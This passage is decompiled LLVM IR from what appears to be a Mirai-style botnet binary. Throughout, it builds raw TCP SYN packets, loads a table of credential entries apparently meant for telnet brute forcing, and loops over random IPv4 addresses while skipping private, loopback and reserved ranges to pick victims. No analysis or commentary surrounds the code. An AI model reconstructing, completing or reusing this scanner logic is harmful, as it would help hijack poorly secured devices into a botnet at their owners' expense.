  br label %dec_label_pc_fc34

dec_label_pc_e684:                                ; preds = %dec_label_pc_e660
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_e688 = load i32, i32* @r5, align 4
  store i32 %v0_e688, i32* @r2, align 4
  %v2_e68c = call i32 @__libc_fcntl(i32 %v3_e66c, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_e694 = or i32 %v2_e68c, 2048
  store i32 %v1_e694, i32* @r2, align 4
  %v0_e698 = load i32, i32* @r4, align 4
  store i32 %v0_e698, i32* %r0.global-to-local, align 4
  %v2_e69c = call i32 @__libc_fcntl(i32 %v0_e698, i32 4)
  %v2_e6a4 = load i32, i32* @global_var_2473c.153, align 4
  store i32 %v2_e6a4, i32* %r0.global-to-local, align 4
  %v2_e6a8 = ptrtoint i8* %stack_var_-56 to i32
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_e6b0 = load i32, i32* @r5, align 4
  store i32 %v0_e6b0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_e6b8 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_e6b8, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_e6c8 = call i32 @__GI_setsockopt(i32 %v2_e6a4, i32 %v0_e6b0, i32 3, i32 %v2_e6b8, i32 4)
  store i32 %v5_e6c8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e6cc = icmp eq i32 %v5_e6c8, 0
  store i1 %v2_e6cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e6cc, label %dec_label_pc_e6d4, label %dec_label_pc_fc28

dec_label_pc_e6d4:                                ; preds = %dec_label_pc_e684, %dec_label_pc_e6d4
  %v0_e6d4 = call i32 @rand_next()
  %v3_e6d8 = mul i32 %v0_e6d4, 65536
  store i32 %v3_e6d8, i32* %r0.global-to-local, align 4
  %v1_e6e0 = mul i32 %v0_e6d4, 256
  %v3_e6e4 = and i32 %v1_e6e0, 65280
  %tmp372 = udiv i32 %v0_e6d4, 256
  %v4_e6e8 = urem i32 %tmp372, 256
  %v5_e6e8 = or i32 %v4_e6e8, %v3_e6e4
  store i32 %v5_e6e8, i32* %r3.global-to-local, align 4
  %v2_e6ec = icmp ugt i32 %v5_e6e8, 1023
  store i1 %v2_e6ec, i1* %cpsr_c.global-to-local, align 1
  %v7_e6ec = icmp eq i32 %v5_e6e8, 1024
  store i1 %v7_e6ec, i1* %cpsr_z.global-to-local, align 1
  %v3_e6f4 = icmp ult i32 %v5_e6e8, 1022
  br i1 %v3_e6f4, label %dec_label_pc_e6d4, label %dec_label_pc_e6f8

dec_label_pc_e6f8:                                ; preds = %dec_label_pc_e6d4
  %v5_e6f0.le = trunc i32 %v0_e6d4 to i16
  store i32 ptrtoint (i8** @global_var_21c24.155 to i32), i32* %r0.global-to-local, align 4
  %v2_e6fc = load i8, i8* bitcast (i8** @global_var_21c24.155 to i8*), align 4
  %v3_e6fc = zext i8 %v2_e6fc to i32
  %v1_e700 = and i32 %v3_e6fc, 240
  %v1_e704 = or i32 %v1_e700, 5
  store i32 %v1_e704, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_21c24.155 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_21c26.156 to i16*), align 4
  %v0_e724 = call i32 @rand_next()
  %v1_e724 = trunc i32 %v0_e724 to i16
  %v3_e72c = load i8, i8* @global_var_21c44.159, align 1
  store i32 ptrtoint (i16* @global_var_21c38.158 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_21c24.155 to i32), i32* %ip.global-to-local, align 4
  %v1_e73c = urem i8 %v3_e72c, 16
  store i16 %v1_e724, i16* bitcast (i32* @global_var_21c28.160 to i16*), align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v1_e74c = or i8 %v1_e73c, 80
  store i8 64, i8* bitcast (i32* @global_var_21c2c.161 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_21c2d.162 to i8*), align 4
  store i8 %v1_e74c, i8* @global_var_21c44.159, align 1
  %v4_e75c = sext i16 %v5_e6f0.le to i32
  store i32 %v4_e75c, i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r0.global-to-local, align 4
  store i16 5888, i16* @global_var_21c3a.163, align 2
  store i16 %v5_e6f0.le, i16* @global_var_21c38.158, align 2
  %v0_e76c = call i32 @rand_next()
  %v1_e76c = trunc i32 %v0_e76c to i16
  %v3_e774 = load i8, i8* @global_var_21c45.164, align 1
  %v4_e774 = zext i8 %v3_e774 to i32
  store i32 ptrtoint (i16* @global_var_21c38.158 to i32), i32* %ip.global-to-local, align 4
  %v1_e77c = or i32 %v4_e774, 2
  store i32 %v1_e77c, i32* %r3.global-to-local, align 4
  store i16 %v1_e76c, i16* bitcast (i32* @global_var_21c46.165 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_1928c.167 to i32), i32* %r1.global-to-local, align 4
  %v1_e788 = trunc i32 %v1_e77c to i8
  store i8 %v1_e788, i8* @global_var_21c45.164, align 1
  store i32 ptrtoint ([5 x i8]* @global_var_19288.169 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_e794 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19288.169 to i32), i32 ptrtoint (i32* @global_var_1928c.167 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_19288.169 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19290.171 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_e7a4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19288.169 to i32), i32 ptrtoint ([5 x i8]* @global_var_19290.171 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_19288.169 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_19298.173 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e7b4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19288.169 to i32), i32 ptrtoint ([9 x i8]* @global_var_19298.173 to i32), i32 12)
  store i32 ptrtoint ([7 x i8]* @global_var_192a4.175 to i32), i32* %r0.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_192a4.175 to i32), i32* %r1.global-to-local, align 4
  %v5_e7c4 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_192a4.175 to i32), i32 ptrtoint ([7 x i8]* @global_var_192a4.175 to i32), i32 12)
  store i32 ptrtoint ([8 x i8]* @global_var_192ac.177 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1928c.167 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_e7d4 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_192ac.177 to i32), i32 ptrtoint (i32* @global_var_1928c.167 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_19288.169 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_192b4.179 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e7e4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19288.169 to i32), i32 ptrtoint ([9 x i8]* @global_var_192b4.179 to i32), i32 12)
  store i32 ptrtoint ([6 x i8]* @global_var_192c0.181 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_192c0.181 to i32), i32* %r1.global-to-local, align 4
  %v5_e7f4 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_192c0.181 to i32), i32 ptrtoint ([6 x i8]* @global_var_192c0.181 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_19288.169 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_192c8.183 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e804 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19288.169 to i32), i32 ptrtoint ([6 x i8]* @global_var_192c8.183 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_192d0.185 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_192d0.185 to i32), i32* %r1.global-to-local, align 4
  %v5_e814 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_192d0.185 to i32), i32 ptrtoint ([8 x i8]* @global_var_192d0.185 to i32), i32 14)
  store i32 ptrtoint ([5 x i8]* @global_var_19288.169 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_192ac.177 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_e824 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19288.169 to i32), i32 ptrtoint ([8 x i8]* @global_var_192ac.177 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_19288.169 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_192d8.187 to i32), i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v4_e834 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19288.169 to i32), i32 ptrtoint (i32* @global_var_192d8.187 to i32), i32 17)
  store i32 ptrtoint ([5 x i8]* @global_var_19288.169 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_192e8.189 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e844 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19288.169 to i32), i32 ptrtoint ([6 x i8]* @global_var_192e8.189 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_192f0.191 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_192f0.191 to i32), i32* %r1.global-to-local, align 4
  %v5_e854 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_192f0.191 to i32), i32 ptrtoint ([5 x i8]* @global_var_192f0.191 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_192f0.191 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_192e8.189 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e864 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_192f0.191 to i32), i32 ptrtoint ([6 x i8]* @global_var_192e8.189 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_192ac.177 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_192f8.193 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_e874 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_192ac.177 to i32), i32 ptrtoint (i32* @global_var_192f8.193 to i32), i32 15)
  store i32 ptrtoint ([8 x i8]* @global_var_192ac.177 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19304.195 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_e884 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_192ac.177 to i32), i32 ptrtoint (i32* @global_var_19304.195 to i32), i32 15)
  store i32 %v4_e884, i32* %r0.global-to-local, align 4
  %v2_e88c = ptrtoint i32* %stack_var_-1866 to i32
  store i32 %v2_e88c, i32* @lr, align 4
  %v1_ebb8 = add i32 %v2_e88c, 20
  %v1_ec0c = add i32 %v2_e88c, 16
  %v2_ec0c = inttoptr i32 %v1_ec0c to i32*
  %v1_ec20 = add i32 %v2_e88c, 9
  %v2_ec20 = inttoptr i32 %v1_ec20 to i8*
  %v1_ecb4 = add i32 %v2_e88c, 12
  %v2_ecb4 = inttoptr i32 %v1_ecb4 to i32*
  %v2_ee98 = ptrtoint i32* %stack_var_-40 to i32
  %v2_eee0 = ptrtoint i32* %stack_var_-68 to i32
  %v2_eee4 = ptrtoint i32* %stack_var_-224 to i32
  %v2_eee8 = ptrtoint i32* %stack_var_-352 to i32
  %v2_f8bc = ptrtoint i32* %stack_var_-45 to i32
  %v2_f8d0 = ptrtoint i32* %stack_var_-77 to i32
  %v2_f828 = ptrtoint i32* %stack_var_-60 to i32
  %v2_f9e4 = ptrtoint i32* %stack_var_-104 to i32
  %v2_e8b4 = ptrtoint i32* %stack_var_-96 to i32
  br label %dec_label_pc_e894

dec_label_pc_e894:                                ; preds = %dec_label_pc_f07c, %dec_label_pc_e6f8
  %stack_var_-1876.0 = phi i32 [ %tmp334, %dec_label_pc_e6f8 ], [ %stack_var_-1876.1, %dec_label_pc_f07c ]
  store i32 ptrtoint (i32* @global_var_21c54.139 to i32), i32* %r0.global-to-local, align 4
  store i32 %stack_var_-1876.0, i32* %r1.global-to-local, align 4
  %v2_e89c = load i32, i32* @global_var_21c54.139, align 4
  store i32 %v2_e89c, i32* @r4, align 4
  %v3_e8a0 = icmp uge i32 %stack_var_-1876.0, %v2_e89c
  store i1 %v3_e8a0, i1* %cpsr_c.global-to-local, align 1
  %v9_e8a0 = icmp eq i32 %stack_var_-1876.0, %v2_e89c
  store i1 %v9_e8a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e8a0, label %dec_label_pc_eba8, label %dec_label_pc_e8a8

dec_label_pc_e8a8:                                ; preds = %dec_label_pc_e894
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %v2_e8b4, i32* @r5, align 4
  br label %dec_label_pc_e8b8

dec_label_pc_e8b8:                                ; preds = %bb407, %dec_label_pc_e8a8
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_e8cc = call i32 @rand_next()
  %v1_e8cc = trunc i32 %v0_e8cc to i16
  store i32 %v0_e8cc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2471c.58 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_21c24.155 to i32), i32* %ip.global-to-local, align 4
  %v2_e8d8 = load i32, i32* @global_var_2471c.58, align 4
  store i32 %v2_e8d8, i32* %r3.global-to-local, align 4
  store i16 %v1_e8cc, i16* bitcast (i32* @global_var_21c28.160 to i16*), align 4
  store i32 %v2_e8d8, i32* @global_var_21c30.196, align 4
  br label %dec_label_pc_e8e4

dec_label_pc_e8e4:                                ; preds = %dec_label_pc_ea3c, %dec_label_pc_e914, %dec_label_pc_ea70, %dec_label_pc_ea64, %dec_label_pc_ea58, %dec_label_pc_ea4c, %.thread48, %.thread32, %.thread28, %.thread24, %bb395, %bb394, %bb393, %bb392, %bb391, %bb390, %bb389, %dec_label_pc_e9b0, %dec_label_pc_e9a8, %bb383, %dec_label_pc_e978, %dec_label_pc_e954, %bb376, %dec_label_pc_e924, %bb375, %dec_label_pc_e90c, %bb374, %bb398, %bb397, %bb396, %bb400, %dec_label_pc_e8b8
  %v0_e8e4 = call i32 @rand_next()
  store i32 %v0_e8e4, i32* %r0.global-to-local, align 4
  %v1_e8e8 = urem i32 %v0_e8e4, 256
  store i32 %v1_e8e8, i32* %r1.global-to-local, align 4
  %v3_e8ec = udiv i32 %v0_e8e4, 256
  store i32 %v3_e8ec, i32* %r3.global-to-local, align 4
  %v3_e8f0 = udiv i32 %v0_e8e4, 65536
  store i32 %v3_e8f0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e8f4 = icmp eq i32 %v1_e8e8, 0
  store i1 %v2_e8f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e8f4, label %bb374, label %bb373

bb373:                                            ; preds = %dec_label_pc_e8e4
  %v3_e8f8 = icmp ugt i32 %v1_e8e8, 126
  store i1 %v3_e8f8, i1* %cpsr_c.global-to-local, align 1
  %v8_e8f8 = icmp eq i32 %v1_e8e8, 127
  store i1 %v8_e8f8, i1* %cpsr_z.global-to-local, align 1
  br label %bb374

bb374:                                            ; preds = %dec_label_pc_e8e4, %bb373
  %v0_e908 = phi i1 [ true, %dec_label_pc_e8e4 ], [ %v8_e8f8, %bb373 ]
  %v1_e8fc = urem i32 %v3_e8ec, 256
  store i32 %v1_e8fc, i32* %ip.global-to-local, align 4
  %v1_e900 = urem i32 %v3_e8f0, 256
  store i32 %v1_e900, i32* %r2.global-to-local, align 4
  %v1_e904 = and i32 %v0_e8e4, 8388608
  %v2_e904 = icmp ne i32 %v1_e904, 0
  store i1 %v2_e904, i1* %cpsr_c.global-to-local, align 1
  %v3_e904 = udiv i32 %v0_e8e4, 16777216
  store i32 %v3_e904, i32* %r0.global-to-local, align 4
  br i1 %v0_e908, label %dec_label_pc_e8e4, label %dec_label_pc_e90c

dec_label_pc_e90c:                                ; preds = %bb374
  %v2_e90c = icmp ugt i32 %v1_e8e8, 2
  store i1 %v2_e90c, i1* %cpsr_c.global-to-local, align 1
  %v7_e90c = icmp eq i32 %v1_e8e8, 3
  store i1 %v7_e90c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e90c, label %dec_label_pc_e8e4, label %dec_label_pc_e914

dec_label_pc_e914:                                ; preds = %dec_label_pc_e90c
  %v1_e914 = add nsw i32 %v1_e8e8, -15
  store i32 %v1_e914, i32* %r3.global-to-local, align 4
  %v2_e918 = icmp ugt i32 %v1_e8e8, 55
  store i1 %v2_e918, i1* %cpsr_c.global-to-local, align 1
  %v7_e918 = icmp eq i32 %v1_e8e8, 56
  store i1 %v7_e918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e918, label %dec_label_pc_e8e4, label %bb375

bb375:                                            ; preds = %dec_label_pc_e914
  %v3_e91c = icmp ne i32 %v1_e914, 0
  store i1 %v3_e91c, i1* %cpsr_c.global-to-local, align 1
  %v8_e91c = icmp eq i32 %v1_e914, 1
  store i1 %v8_e91c, i1* %cpsr_z.global-to-local, align 1
  %v2_e920 = xor i1 %v3_e91c, true
  %v3_e920 = or i1 %v8_e91c, %v2_e920
  br i1 %v3_e920, label %dec_label_pc_e8e4, label %dec_label_pc_e924

dec_label_pc_e924:                                ; preds = %bb375
  %v2_e924 = icmp ugt i32 %v1_e8e8, 9
  store i1 %v2_e924, i1* %cpsr_c.global-to-local, align 1
  %v7_e924 = icmp eq i32 %v1_e8e8, 10
  store i1 %v7_e924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e924, label %dec_label_pc_e8e4, label %dec_label_pc_e92c

dec_label_pc_e92c:                                ; preds = %dec_label_pc_e924
  %v2_e92c = icmp ugt i32 %v1_e8e8, 191
  store i1 %v2_e92c, i1* %cpsr_c.global-to-local, align 1
  %v7_e92c = icmp eq i32 %v1_e8e8, 192
  store i1 %v7_e92c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e92c, label %bb376, label %dec_label_pc_e938

bb376:                                            ; preds = %dec_label_pc_e92c
  %v3_e930 = icmp ugt i32 %v1_e8fc, 167
  store i1 %v3_e930, i1* %cpsr_c.global-to-local, align 1
  %v8_e930 = icmp eq i32 %v1_e8fc, 168
  store i1 %v8_e930, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e930, label %dec_label_pc_e8e4, label %dec_label_pc_e938

dec_label_pc_e938:                                ; preds = %dec_label_pc_e92c, %bb376
  %v7_e938 = icmp eq i32 %v1_e8e8, 172
  %.461 = zext i1 %v7_e938 to i32
  store i32 %.461, i32* %r3.global-to-local, align 4
  %v2_e944 = icmp ugt i32 %v1_e8fc, 14
  store i1 %v2_e944, i1* %cpsr_c.global-to-local, align 1
  %v7_e944 = icmp eq i32 %v1_e8fc, 15
  store i1 %v7_e944, i1* %cpsr_z.global-to-local, align 1
  %v2_e948 = xor i1 %v2_e944, true
  %v3_e948 = or i1 %v7_e944, %v2_e948
  br i1 %v3_e948, label %.thread8, label %bb379

.thread8:                                         ; preds = %dec_label_pc_e938
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e95c

bb379:                                            ; preds = %dec_label_pc_e938
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e94c = icmp eq i1 %v7_e938, false
  store i1 %v2_e94c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e94c, label %dec_label_pc_e95c, label %dec_label_pc_e954

dec_label_pc_e954:                                ; preds = %bb379
  %v2_e954 = icmp ugt i32 %v1_e8fc, 30
  store i1 %v2_e954, i1* %cpsr_c.global-to-local, align 1
  %v7_e954 = icmp eq i32 %v1_e8fc, 31
  store i1 %v7_e954, i1* %cpsr_z.global-to-local, align 1
  %v2_e958 = xor i1 %v2_e954, true
  %v3_e958 = or i1 %v7_e954, %v2_e958
  br i1 %v3_e958, label %dec_label_pc_e8e4, label %dec_label_pc_e95c

dec_label_pc_e95c:                                ; preds = %.thread8, %dec_label_pc_e954, %bb379
  %v7_e95c = icmp eq i32 %v1_e8e8, 100
  %.462 = zext i1 %v7_e95c to i32
  store i32 %.462, i32* %r3.global-to-local, align 4
  %v2_e968 = icmp ugt i32 %v1_e8fc, 62
  store i1 %v2_e968, i1* %cpsr_c.global-to-local, align 1
  %v7_e968 = icmp eq i32 %v1_e8fc, 63
  store i1 %v7_e968, i1* %cpsr_z.global-to-local, align 1
  %v2_e96c = xor i1 %v2_e968, true
  %v3_e96c = or i1 %v7_e968, %v2_e96c
  br i1 %v3_e96c, label %.thread13, label %bb382

.thread13:                                        ; preds = %dec_label_pc_e95c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e980

bb382:                                            ; preds = %dec_label_pc_e95c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e970 = icmp eq i1 %v7_e95c, false
  store i1 %v2_e970, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e970, label %dec_label_pc_e980, label %dec_label_pc_e978

dec_label_pc_e978:                                ; preds = %bb382
  %v2_e978 = icmp ugt i32 %v1_e8fc, 125
  store i1 %v2_e978, i1* %cpsr_c.global-to-local, align 1
  %v7_e978 = icmp eq i32 %v1_e8fc, 126
  store i1 %v7_e978, i1* %cpsr_z.global-to-local, align 1
  %v2_e97c = xor i1 %v2_e978, true
  %v3_e97c = or i1 %v7_e978, %v2_e97c
  br i1 %v3_e97c, label %dec_label_pc_e8e4, label %dec_label_pc_e980

dec_label_pc_e980:                                ; preds = %.thread13, %dec_label_pc_e978, %bb382
  %v2_e980 = icmp ugt i32 %v1_e8e8, 168
  store i1 %v2_e980, i1* %cpsr_c.global-to-local, align 1
  %v7_e980 = icmp eq i32 %v1_e8e8, 169
  store i1 %v7_e980, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e980, label %bb383, label %dec_label_pc_e98c

bb383:                                            ; preds = %dec_label_pc_e980
  %v3_e984 = icmp eq i32 %v1_e8fc, 255
  store i1 %v3_e984, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_e984, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e984, label %dec_label_pc_e8e4, label %dec_label_pc_e98c

dec_label_pc_e98c:                                ; preds = %dec_label_pc_e980, %bb383
  %v7_e98c = icmp eq i32 %v1_e8e8, 198
  %.463 = zext i1 %v7_e98c to i32
  store i32 %.463, i32* %r3.global-to-local, align 4
  %v2_e998 = icmp ugt i32 %v1_e8fc, 16
  store i1 %v2_e998, i1* %cpsr_c.global-to-local, align 1
  %v7_e998 = icmp eq i32 %v1_e8fc, 17
  store i1 %v7_e998, i1* %cpsr_z.global-to-local, align 1
  %v2_e99c = xor i1 %v2_e998, true
  %v3_e99c = or i1 %v7_e998, %v2_e99c
  br i1 %v3_e99c, label %.thread19, label %bb386

.thread19:                                        ; preds = %dec_label_pc_e98c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e9b0

bb386:                                            ; preds = %dec_label_pc_e98c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e9a0 = icmp eq i1 %v7_e98c, false
  store i1 %v2_e9a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e9a0, label %dec_label_pc_e9b0, label %dec_label_pc_e9a8

dec_label_pc_e9a8:                                ; preds = %bb386
  %v2_e9a8 = icmp ugt i32 %v1_e8fc, 18
  store i1 %v2_e9a8, i1* %cpsr_c.global-to-local, align 1
  %v7_e9a8 = icmp eq i32 %v1_e8fc, 19
  store i1 %v7_e9a8, i1* %cpsr_z.global-to-local, align 1
  %v2_e9ac = xor i1 %v2_e9a8, true
  %v3_e9ac = or i1 %v7_e9a8, %v2_e9ac
  br i1 %v3_e9ac, label %dec_label_pc_e8e4, label %dec_label_pc_e9b0

dec_label_pc_e9b0:                                ; preds = %.thread19, %dec_label_pc_e9a8, %bb386
  %v2_e9b0 = icmp ugt i32 %v1_e8e8, 222
  store i1 %v2_e9b0, i1* %cpsr_c.global-to-local, align 1
  %v7_e9b0 = icmp eq i32 %v1_e8e8, 223
  store i1 %v7_e9b0, i1* %cpsr_z.global-to-local, align 1
  %v2_e9b4 = xor i1 %v7_e9b0, true
  %v3_e9b4 = and i1 %v2_e9b0, %v2_e9b4
  br i1 %v3_e9b4, label %dec_label_pc_e8e4, label %dec_label_pc_e9b8

dec_label_pc_e9b8:                                ; preds = %dec_label_pc_e9b0
  %v7_e9b8 = icmp eq i32 %v1_e8e8, 106
  %.464 = zext i1 %v7_e9b8 to i32
  %v2_e9c4 = icmp ugt i32 %v1_e8fc, 185
  store i1 %v2_e9c4, i1* %cpsr_c.global-to-local, align 1
  %v7_e9c4 = icmp eq i32 %v1_e8fc, 186
  store i1 %v7_e9c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9c4, label %bb389, label %dec_label_pc_e9d0

bb389:                                            ; preds = %dec_label_pc_e9b8
  %v2_e9b8 = icmp ugt i32 %v1_e8e8, 105
  store i1 %v2_e9b8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e9b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9b8, label %dec_label_pc_e8e4, label %dec_label_pc_e9d0

dec_label_pc_e9d0:                                ; preds = %dec_label_pc_e9b8, %bb389
  %v2_e9d0 = icmp ugt i32 %v1_e8fc, 186
  store i1 %v2_e9d0, i1* %cpsr_c.global-to-local, align 1
  %v7_e9d0 = icmp eq i32 %v1_e8fc, 187
  store i1 %v7_e9d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9d0, label %.thread24, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_e9d0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e9e4

.thread24:                                        ; preds = %dec_label_pc_e9d0
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e9dc = icmp eq i1 %v7_e9b8, false
  store i1 %v2_e9dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e9dc, label %dec_label_pc_e9e4, label %dec_label_pc_e8e4

dec_label_pc_e9e4:                                ; preds = %.thread25, %.thread24
  %v2_e9e4 = icmp ugt i32 %v1_e8fc, 184
  store i1 %v2_e9e4, i1* %cpsr_c.global-to-local, align 1
  %v7_e9e4 = icmp eq i32 %v1_e8fc, 185
  store i1 %v7_e9e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9e4, label %.thread28, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_e9e4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e9f8

.thread28:                                        ; preds = %dec_label_pc_e9e4
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e9f0 = icmp eq i1 %v7_e9b8, false
  store i1 %v2_e9f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e9f0, label %dec_label_pc_e9f8, label %dec_label_pc_e8e4

dec_label_pc_e9f8:                                ; preds = %.thread29, %.thread28
  %v2_e9f8 = icmp ugt i32 %v1_e8fc, 183
  store i1 %v2_e9f8, i1* %cpsr_c.global-to-local, align 1
  %v7_e9f8 = icmp eq i32 %v1_e8fc, 184
  store i1 %v7_e9f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9f8, label %.thread32, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_e9f8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
